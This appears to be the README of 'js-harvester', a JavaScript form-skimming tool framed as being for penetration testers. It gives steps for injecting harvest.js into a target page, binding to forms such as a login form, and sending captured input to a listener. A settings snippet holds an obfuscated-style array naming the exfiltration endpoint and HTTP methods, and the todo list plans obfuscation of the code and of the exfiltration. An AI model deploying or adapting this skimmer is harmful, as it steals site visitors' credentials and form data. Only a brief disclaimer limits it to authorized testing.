# js-harvester
A tool for pen testers to use in an engagement where data must be captured from a web form.
> [!CAUTION]
> Disclaimer: Intended only for use on systems that you are legally authorized to access. 
# installation
* Requires jQuery
* Download and host script
# usage
1. Identify target page to harvest data from
3. Add harvest.js to the target page
```
<script type="text/javascript" src="harvest.js"></script>
```
4. Run a HTTP or HTTPS service to receive data from the script
6. Update the settings in harvest.js
```
//var siteId = "updateme";
//var formId = "updateme";
var bindAllFormsSwitch = true;
var formName = "loginform2";
var enableEncoding = true;
var usePost = false;
var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
```
5. Listen. . .
# todo list
* ~~dynamic form binding and processing~~
* ~~support for exfiltration through configurable HTTP methods~~
* ~~use hash values to identify site and form IDs~~
* ~~ability to bind multiple forms dynamically~~
* code obfuscation
* obfuscation for data exfiltration
* remove jQuery dependencies
